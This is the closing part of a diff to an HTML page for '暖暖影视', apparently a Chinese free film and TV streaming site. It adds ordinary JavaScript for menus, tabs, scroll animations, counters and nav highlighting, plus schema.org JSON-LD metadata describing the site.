+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');menuBtn.textContent='☰';menuBtn.setAttribute('aria-expanded','false');});});
+
+// Tab 切换
+document.querySelectorAll('#hot .tabs button').forEach(function(b){
+  b.addEventListener('click',function(){
+    document.querySelectorAll('#hot .tabs button').forEach(function(x){x.classList.remove('on');x.setAttribute('aria-selected','false');});
+    b.classList.add('on');b.setAttribute('aria-selected','true');
+  });
+});
+
+// 滚动揭示
+var io=new IntersectionObserver(function(entries){
+  entries.forEach(function(e){if(e.isIntersecting){e.target.classList.add('show');io.unobserve(e.target);}});
+},{threshold:.15});
+document.querySelectorAll('.numcard,.poster,.feat-row,.headline,.nlist a,.dash .d,.bar,.tl,.about-card,.numcard').forEach(function(el){el.classList.add('reveal');io.observe(el);});
+
+// 数字滚动
+var no=new IntersectionObserver(function(entries){
+  entries.forEach(function(e){
+    if(e.isIntersecting){
+      var b=e.target,d=parseInt(b.getAttribute('data-count'),10),step=Math.max(1,Math.floor(d/60)),cur=0;
+      var t=setInterval(function(){cur+=step;if(cur>=d){cur=d;clearInterval(t);}b.textContent=cur.toLocaleString();},24);
+      no.unobserve(b);
+    }
+  });
+},{threshold:.5});
+document.querySelectorAll('[data-count]').forEach(function(b){no.observe(b);});
+
+// 进度条
+var bo=new IntersectionObserver(function(entries){
+  entries.forEach(function(e){if(e.isIntersecting){var i=e.target;setTimeout(function(){i.style.width=i.getAttribute('data-w')+'%';},150);bo.unobserve(i);}});
+},{threshold:.4});
+document.querySelectorAll('.track i').forEach(function(i){bo.observe(i);});
+
+// 导航滚动高亮
+var links=document.querySelectorAll('#nav a'),secs=[];
+links.forEach(function(a){var s=document.querySelector(a.getAttribute('href'));if(s)secs.push(s);});
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+120,cur='';
+  secs.forEach(function(s){if(y>=s.offsetTop)cur='#'+s.id;});
+  links.forEach(function(a){a.classList.toggle('active',a.getAttribute('href')===cur);});
+});
+</script>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {"@type":"WebSite","@id":"https://nuannuanyingshi-cn.github.io/#website","url":"https://nuannuanyingshi-cn.github.io/","name":"暖暖影视","alternateName":["暖暖影视官网","暖暖影视大全","暖暖影视免费看"],"description":"暖暖影视官网提供最新高清电影、热播电视剧、动漫综艺免费在线观看，暖暖影视大全每日更新。","inLanguage":"zh-CN","potentialAction":{"@type":"SearchAction","target":"https://nuannuanyingshi-cn.github.io/?q={search_term_string}","query-input":"required name=search_term_string"}},
+    {"@type":"Organization","@id":"https://nuannuanyingshi-cn.github.io/#org","name":"暖暖影视","url":"https://nuannuanyingshi-cn.github.io/","description":"暖暖影视官网运营团队","logo":{"@type":"ImageObject","url":"https://nuannuanyingshi-cn.github.io/logo.png"}},
+    {"@type":"MovieTheater","@id":"https://nuannuanyingshi-cn.github.io/#theater","name":"暖暖影视在线影院","url":"https://nuannuanyingshi-cn.github.io/","description":"暖暖影视免费高清在线观看平台"}
+  ]
+}
+</script>
+</body>
+</html>
